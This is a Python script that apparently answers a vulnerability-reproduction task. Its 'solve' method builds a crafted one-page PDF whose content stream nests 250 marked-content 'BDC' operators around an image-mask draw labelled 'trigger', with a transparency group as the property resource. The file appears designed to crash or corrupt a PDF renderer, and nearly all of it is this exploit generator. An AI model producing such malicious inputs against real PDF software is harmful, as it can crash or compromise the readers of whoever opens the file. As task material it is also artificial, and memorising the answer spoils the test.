import sys

class _PDFBuilder:
    def __init__(self):
        self.objects = []

    def add_object(self, obj_num, content_bytes):
        self.objects.append((obj_num, content_bytes))

    def build(self):
        pdf = b"%PDF-1.7\n\x80\x81\x82\x83\n"
        offsets = {}
        
        sorted_objects = sorted(self.objects, key=lambda x: x[0])
        
        for obj_num, content in sorted_objects:
            offsets[obj_num] = len(pdf)
            pdf += f"{obj_num} 0 obj\n".encode('latin-1')
            pdf += content
            pdf += b"\nendobj\n"
            
        xref_offset = len(pdf)
        pdf += b"xref\n"
        
        max_obj_num = 0
        if sorted_objects:
            max_obj_num = sorted_objects[-1][0]
        
        pdf += f"0 {max_obj_num + 1}\n".encode('latin-1')
        pdf += b"0000000000 65535 f \n"
        
        for i in range(1, max_obj_num + 1):
            if i in offsets:
                pdf += f"{offsets[i]:010d} 00000 n \n".encode('latin-1')
            else:
                pdf += b"0000000000 65535 f \n"
            
        root_obj_num = self.objects[0][0]
        pdf += b"trailer\n"
        pdf += f"<< /Size {max_obj_num + 1} /Root {root_obj_num} 0 R >>\n".encode('latin-1')
        pdf += b"startxref\n"
        pdf += f"{xref_offset}\n".encode('latin-1')
        pdf += b"%%EOF\n"
        
        return pdf

class Solution:
    def solve(self, src_path: str) -> bytes:
        builder = _PDFBuilder()

        NESTING_DEPTH = 250

        bdc_part = b"/T1 BDC " * NESTING_DEPTH
        emc_part = b"EMC " * NESTING_DEPTH
        trigger = b"q 0 0 1 1 re W n /Im1 Do Q"
        page_payload = bdc_part + trigger + emc_part

        builder.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        builder.add_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        page_resources = b"<< /XObject << /Im1 5 0 R >> /Properties << /T1 6 0 R >> >>"
        page_dict = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources " + page_resources + b" >>"
        builder.add_object(3, page_dict)
        
        stream = f"<< /Length {len(page_payload)} >>\nstream\n".encode('latin-1') + page_payload + b"\nendstream"
        builder.add_object(4, stream)
        
        img_stream_data = b"\x00"
        img_dict = f"""<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ImageMask true
   /ColorSpace /DeviceGray /BitsPerComponent 1 /Length {len(img_stream_data)} >>
stream
""".encode('latin-1') + img_stream_data + b"\nendstream"
        builder.add_object(5, img_dict)
        
        builder.add_object(6, b"<< /Type /Group /S /Transparency /CS /DeviceRGB /I false /K false >>")
        
        return builder.build()